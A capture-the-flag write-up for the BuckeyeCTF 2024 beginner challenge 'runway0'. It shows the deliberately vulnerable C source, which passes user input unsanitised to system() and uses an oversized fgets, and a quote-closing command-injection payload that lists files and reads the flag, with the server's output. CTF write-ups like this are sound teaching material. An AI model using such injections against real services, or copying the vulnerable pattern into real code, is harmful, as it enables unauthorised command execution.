---
title: "runway0 - BuckeyeCTF 2024"
category: "pwn"
subcategory: "rce"
type: "writeup"
tags: ["pwn", "command-injection", "runway0", "rce", "buckeyectf", "buckeyectf-2024", "2024", "ctf-writeup"]
summary: "If you've never done a CTF before, this runway should help!"
source:
  name: "CTFtime writeup #39489"
  url: "https://ctftime.org/writeup/39489"
original_source: "https://github.com/Execut3/CTF/tree/master/Writeups/2024/BuckeyeCTF/runway0"
ctf:
  name: "BuckeyeCTF 2024"
  year: 2024
  challenge: "runway0"
---

## Metadata

- **CTF:** BuckeyeCTF 2024
- **Task:** runway0
- **Author team:** Execut3
- **CTFtime:** <https://ctftime.org/writeup/39489>
- **Original writeup:** <https://github.com/Execut3/CTF/tree/master/Writeups/2024/BuckeyeCTF/runway0>

---
## runway0 [50 pts]

**Category:** beginner-pwn  
**Solves:** 347

## Description  
beginner-pwn4 / 6

If you've never done a CTF before, this runway should help!

Hint: MacOS users (on M series) will need a x86 Linux VM. Tutorial is here: [pwnoh.io/utm](http://pwnoh.io/utm)

nc [challs.pwnoh.io](http://challs.pwnoh.io) 13400 

### Solution

Checking the binary:  
```c  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>

int main() {  
char command[110] = "cowsay \"";  
char message[100];

printf("Give me a message to say!\n");  
fflush(stdout);

fgets(message, 0x100, stdin);

strncat(command, message, 98);  
strncat(command, "\"", 2);

system(command);  
}  
```

It's a simple command injection, we should close `cowsay` command and insert our commands. 

Send sample payload like `"; ls`

```bash  
nc [challs.pwnoh.io](http://challs.pwnoh.io) 13400   
Give me a message to say!  
hello"; ls  
_______  
< hello >  
\-------  
\ ^__^  
\ (oo)\\_______  
(__)\ )\/\  
||----w |  
|| ||  
flag.txt  
run  
sh: 2: Syntax error: Unterminated quoted string

```

Ok let's read the flag now:

```bash  
$ nc [challs.pwnoh.io](http://challs.pwnoh.io) 13400   
Give me a message to say!  
hello"; cat flag.txt  
_______  
< hello >  
\-------  
\ ^__^  
\ (oo)\\_______  
(__)\ )\/\  
||----w |  
|| ||  
bctf{flaghere}sh: 2: Syntax error: Unterminated quoted string  
```
